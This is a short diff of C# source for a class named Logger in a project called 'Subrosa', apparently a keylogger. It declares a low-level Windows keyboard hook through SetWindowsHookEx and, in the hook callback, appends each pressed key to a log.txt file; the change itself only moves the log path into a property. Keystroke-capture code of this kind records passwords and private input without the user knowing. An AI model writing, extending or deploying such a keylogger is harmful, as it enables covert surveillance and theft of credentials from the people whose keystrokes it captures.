@@ -9,6 +9,8 @@ namespace Subrosa
 {
     public class Logger
     {
+        public static string LogPath => Application.StartupPath;
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook,
         LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -47,7 +49,7 @@ namespace Subrosa
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
-                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
+                StreamWriter sw = new StreamWriter(LogPath + @"\log.txt", true);
                 int vkCode = Marshal.ReadInt32(lParam);
 
                 switch (vkCode)
